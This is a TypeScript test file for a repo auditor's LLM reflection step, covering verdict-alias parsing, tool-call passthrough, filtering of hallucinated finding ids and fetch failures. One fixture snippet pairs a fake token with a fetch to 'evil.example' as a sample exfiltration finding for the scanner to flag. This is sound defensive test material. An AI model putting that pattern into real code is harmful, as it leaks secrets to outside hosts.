import { describe, expect, it, vi } from "vitest";
import { parseReflectionResponse, runReflection } from "../src/reflect.js";
import type { AiProviderConfig } from "../src/types.js";
import type { AuditReport, Finding } from "@repo-auditor/scanner-core";

const config: AiProviderConfig = {
  type: "cloud",
  baseUrl: "https://api.example.test/v1",
  model: "gpt-test",
  dataSharingMode: "full-files",
  redactionEnabled: true,
  timeoutMs: 30000,
  retryLimit: 0
};

const finding: Finding = {
  id: "finding-1",
  riskLevel: "Critical",
  category: "network",
  filePath: "src/index.ts",
  lineStart: 1,
  lineEnd: 1,
  codeSnippet: "const token = '123456:ABCdefSecretValueABCdefSecretValue'; fetch('https://evil.example')",
  explanation: "network exfiltration candidate",
  recommendedFix: "Remove sensitive payloads from outbound requests.",
  evidenceTags: ["network-endpoint", "exfiltration-candidate"],
  confidence: "High"
};

const report: AuditReport = {
  target: {
    type: "local-directory",
    source: "fixture",
    localPath: "fixture",
    provenance: { source: "fixture" },
    networkUsed: false,
    trustBoundary: "local"
  },
  findings: [finding],
  dataFlow: { nodes: [], edges: [] },
  attackSurface: [],
  risk: {
    overallRiskLevel: "Critical",
    decision: "Block",
    rationale: "blocking finding",
    topRisks: ["Critical: network exfiltration candidate"],
    severityCounts: { Critical: 1, High: 0, Medium: 0, Low: 0, Info: 0 },
    categoryCounts: { network: 1 },
    blockingFindingIds: ["finding-1"],
    residualRisk: "static only",
    scanLimitations: ["static analysis only"]
  },
  generatedAt: "2026-06-14T00:00:00.000Z",
  toolVersion: "0.1.0"
};

describe("parseReflectionResponse", () => {
  const pick = (verdict: unknown) => {
    const parsed = parseReflectionResponse(
      JSON.stringify({ type: "final", reflections: [{ findingId: "finding-1", verdict, reasoning: "r" }] })
    );
    return parsed?.type === "final" ? parsed.result.reflections[0]?.verdict : undefined;
  };

  it("normalizes likely-false-positive verdict aliases", () => {
    expect(pick("FALSE_POSITIVE")).toBe("likely-false-positive");
    expect(pick("fp")).toBe("likely-false-positive");
    expect(pick("likely-false-positive")).toBe("likely-false-positive");
  });

  it("normalizes reaffirmed verdict aliases", () => {
    expect(pick("real")).toBe("reaffirmed");
    expect(pick("confirmed")).toBe("reaffirmed");
    expect(pick("reaffirmed")).toBe("reaffirmed");
  });

  it("maps unknown verdicts to uncertain", () => {
    expect(pick("maybe")).toBe("uncertain");
    expect(pick(undefined)).toBe("uncertain");
  });

  it("passes tool calls through", () => {
    const parsed = parseReflectionResponse(
      JSON.stringify({ type: "tool_call", tool: "file_read", args: { path: "src/index.ts" } })
    );
    expect(parsed?.type).toBe("tool_call");
    if (parsed?.type === "tool_call") {
      expect(parsed.tool).toBe("file_read");
    }
  });

  it("parses final reflections and tolerates key aliases", () => {
    const parsed = parseReflectionResponse(
      JSON.stringify({
        type: "final",
        verdicts: [{ finding_id: "finding-1", verdict: "confirmed", reason: "verified in code" }]
      })
    );
    expect(parsed?.type).toBe("final");
    if (parsed?.type === "final") {
      expect(parsed.result.reflections).toEqual([
        { findingId: "finding-1", verdict: "reaffirmed", reasoning: "verified in code" }
      ]);
    }
  });

  it("returns undefined for non-JSON text", () => {
    expect(parseReflectionResponse("plain text")).toBeUndefined();
  });
});

describe("runReflection", () => {
  function jsonCompletion(content: string) {
    return vi.fn(async () => ({
      ok: true,
      status: 200,
      text: async () => "",
      json: async () => ({ choices: [{ message: { content } }] })
    }));
  }

  it("returns reflections filtered to known finding ids", async () => {
    const fetchImpl = jsonCompletion(
      JSON.stringify({
        type: "final",
        reflections: [
          { findingId: "finding-1", verdict: "reaffirmed", reasoning: "verified" },
          { findingId: "hallucinated-id", verdict: "likely-false-positive", reasoning: "made up" }
        ]
      })
    );
    const result = await runReflection([finding], report, config, { scanPath: "fixture" }, fetchImpl);
    expect(result.truncated).toBe(false);
    expect(result.reflections).toEqual([
      { findingId: "finding-1", verdict: "reaffirmed", reasoning: "verified" }
    ]);
    expect(fetchImpl).toHaveBeenCalledTimes(1);
  });

  it("returns truncated empty result when the fetch throws", async () => {
    const fetchImpl = vi.fn(async () => {
      throw new Error("network down");
    });
    const result = await runReflection([finding], report, config, { scanPath: "fixture" }, fetchImpl);
    expect(result).toEqual({ reflections: [], raw: "", truncated: true });
  });
});
